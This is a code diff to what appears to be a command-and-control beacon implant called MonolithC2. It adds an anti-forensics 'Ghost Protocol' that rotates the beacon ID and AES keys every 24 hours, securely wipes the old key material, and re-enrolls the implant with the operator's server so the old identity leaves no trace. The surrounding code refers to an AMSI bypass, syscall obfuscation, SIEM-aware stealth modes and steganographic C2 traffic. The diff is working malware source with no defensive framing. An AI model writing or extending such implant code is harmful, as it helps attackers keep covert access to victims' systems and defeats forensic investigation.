@@ -15,6 +15,7 @@ import sys
 import time
 import json
 import random
+import secrets
 import base64
 import hashlib
 import platform
@@ -43,6 +44,15 @@ try:
 except ImportError:
     C2_TRAFFIC_ENTROPY_AVAILABLE = False
     C2TrafficEntropy = None
+
+# NEW: Anti-forensics key / beacon-ID rotation
+try:
+    from evasion.anti_forensics_rotation import AntiForensicsRotator, secure_wipe
+    ANTI_FORENSICS_AVAILABLE = True
+except ImportError:
+    ANTI_FORENSICS_AVAILABLE = False
+    AntiForensicsRotator = None
+    secure_wipe = None
 
 # Import evasion modules
 try:
@@ -528,7 +538,8 @@ class TransientNetworkCrypto:
     def __init__(self, beacon_id: str = "", shared_secret: str = "MonolithC2TransientSecret2026"):
         self.beacon_id = beacon_id
         self.shared_secret = shared_secret
-        self._key = self._derive_key()
+        # Key kept in a mutable bytearray so it can be securely wiped on rotate.
+        self._key = bytearray(self._derive_key())
 
     def _derive_key(self) -> bytes:
         """Derive 256-bit key from beacon_id + shared secret"""
@@ -537,9 +548,25 @@ class TransientNetworkCrypto:
         ).digest()
 
     def set_beacon_id(self, beacon_id: str):
-        """Update key after beacon registration"""
+        """Update key after beacon registration (old key wiped)."""
+        old = self._key
         self.beacon_id = beacon_id
-        self._key = self._derive_key()
+        self._key = bytearray(self._derive_key())
+        if secure_wipe is not None:
+            secure_wipe(old)
+
+    def rotate(self, new_beacon_id: str = None) -> str:
+        """
+        Anti-forensics rotation: adopt a new beacon ID, re-derive the key,
+        and securely wipe the previous key bytes before dropping them.
+        Returns the new beacon ID.
+        """
+        old = self._key
+        self.beacon_id = new_beacon_id or secrets.token_hex(16)
+        self._key = bytearray(self._derive_key())
+        if secure_wipe is not None:
+            secure_wipe(old)
+        return self.beacon_id
 
     def encrypt(self, plaintext: bytes) -> bytes:
         """
@@ -550,7 +577,7 @@ class TransientNetworkCrypto:
             return plaintext
 
         nonce = os.urandom(12)
-        aesgcm = AESGCM(self._key)
+        aesgcm = AESGCM(bytes(self._key))
         ciphertext = aesgcm.encrypt(nonce, plaintext, None)
         return base64.b64encode(nonce + ciphertext)
 
@@ -566,7 +593,7 @@ class TransientNetworkCrypto:
             raw = base64.b64decode(encoded) if isinstance(encoded, (bytes, bytearray)) else encoded
             nonce = raw[:12]
             ciphertext = raw[12:]
-            aesgcm = AESGCM(self._key)
+            aesgcm = AESGCM(bytes(self._key))
             return aesgcm.decrypt(nonce, ciphertext, None)
         except Exception:
             return encoded
@@ -576,14 +603,22 @@ class TaskCrypto:
     """Encrypt/decrypt tasks in memory. No plaintext tasks stored."""
 
     def __init__(self, key: bytes = None):
-        self._key = key or os.urandom(32)
+        # Mutable key for secure wipe on rotation.
+        self._key = bytearray(key if key is not None else os.urandom(32))
+
+    def rotate(self) -> None:
+        """Anti-forensics rotation: replace and securely wipe the task key."""
+        old = self._key
+        self._key = bytearray(os.urandom(32))
+        if secure_wipe is not None:
+            secure_wipe(old)
 
     def encrypt_task(self, task_data: bytes) -> bytes:
         if not HAS_AES_GCM or not task_data:
             return task_data
         try:
             nonce = os.urandom(12)
-            aesgcm = AESGCM(self._key)
+            aesgcm = AESGCM(bytes(self._key))
             ciphertext = aesgcm.encrypt(nonce, task_data, None)
             return base64.b64encode(nonce + ciphertext)
         except Exception:
@@ -596,7 +631,7 @@ class TaskCrypto:
             raw = base64.b64decode(encrypted_data) if isinstance(encrypted_data, (bytes, bytearray)) else encrypted_data
             nonce = raw[:12]
             ciphertext = raw[12:]
-            aesgcm = AESGCM(self._key)
+            aesgcm = AESGCM(bytes(self._key))
             return aesgcm.decrypt(nonce, ciphertext, None)
         except Exception:
             return encrypted_data
@@ -636,6 +671,9 @@ class BeaconConfig:
     injection_delay_ms: int = 2000
     # NEW: C2 traffic entropy obfuscation (stego/decoy carriers)
     enable_traffic_entropy: bool = True
+    # NEW: Anti-forensics rotation (every 24h rotate beacon ID + all keys)
+    enable_anti_forensics_rotation: bool = True
+    rotation_interval: int = 86400  # seconds (24h)
     # NEW: Syscall obfuscation settings
     enable_syscall_obfuscation: bool = True
     syscall_obfuscation_layer: str = "full_monster"  # none, indirect_call, fresh_ssn, gan_mutate, full_monster
@@ -819,6 +857,30 @@ class EvasiveBeacon:
         # NEW: Transient task encryption (tasks never stored plaintext in memory)
         self._task_encryption_key = os.urandom(32)
         self._pending_tasks: Dict[str, bytes] = {}
+
+        # NEW: Anti-forensics rotation (rotate beacon ID + all keys every
+        # `rotation_interval` so no forensic byte of the old identity remains).
+        self._anti_forensics = None
+        if ANTI_FORENSICS_AVAILABLE and AntiForensicsRotator is not None:
+            try:
+                def _rotate_task_key():
+                    old = bytearray(self._task_encryption_key)
+                    self._task_encryption_key = os.urandom(32)
+                    if secure_wipe is not None:
+                        secure_wipe(old)
+
+                self._anti_forensics = AntiForensicsRotator(
+                    network_crypto=self.network_crypto,
+                    config=config,
+                    task_crypto=None,
+                    extra_key_rotators=[_rotate_task_key],
+                    shared_secret="MonolithC2TransientSecret2026",
+                    on_rotate=self._re_enroll_after_rotation,
+                )
+                print("[+] Anti-forensics rotation engine initialized")
+            except Exception as e:
+                print(f"[!] Failed to initialize anti-forensics rotation: {e}")
+                self._anti_forensics = None
 
         # NEW: Initialize HWBP AMSI bypass engine
         self.hwbp_amsi = None
@@ -1450,6 +1512,10 @@ class EvasiveBeacon:
                     elif self.current_stealth_level == "paranoid":
                         print(f"[*] SIEM healthy: staying in PARANOID mode (maximum stealth)")
                 
+                # NEW: Anti-forensics rotation (rotate beacon ID + keys on cadence)
+                if self._anti_forensics is not None:
+                    self.maybe_rotate_anti_forensics()
+
                 # Check in with C2
                 tasks = self._checkin()
                 
@@ -1749,6 +1815,43 @@ class EvasiveBeacon:
                 mutable = bytearray(data)
                 for i in range(len(mutable)):
                     mutable[i] = 0
+        except Exception:
+            pass
+
+    # ------------------------------------------------------------------
+    # Anti-forensics rotation (Ghost Protocol)
+    # ------------------------------------------------------------------
+    def rotate_anti_forensics(self):
+        """
+        Force an immediate full rotation of beacon ID and all in-memory keys.
+        Old key material is securely wiped before the new identity is adopted.
+        Returns the RotationReport, or None if rotation is unavailable.
+        """
+        if self._anti_forensics is None:
+            return None
+        return self._anti_forensics.rotate()
+
+    def maybe_rotate_anti_forensics(self, now: float = None):
+        """
+        Rotate if the configured interval has elapsed. Called from the
+        check-in loop so the beacon silently re-identifies on a 24h cadence.
+        """
+        if self._anti_forensics is None:
+            return None
+        return self._anti_forensics.maybe_rotate(now)
+
+    def _re_enroll_after_rotation(self, report):
+        """
+        Hook invoked after each rotation. The signed envelope is stored for
+        the next check-in so the C2 server can re-link the new beacon ID to
+        the operator session. The old ID is never persisted to disk.
+        """
+        try:
+            self._last_rotation_envelope = report.envelope
+            logger.info(
+                f"Anti-forensics rotation: {report.old_beacon_id[:8]} -> "
+                f"{report.new_beacon_id[:8]} ({report.rotated_keys} keys wiped)"
+            )
         except Exception:
             pass
 
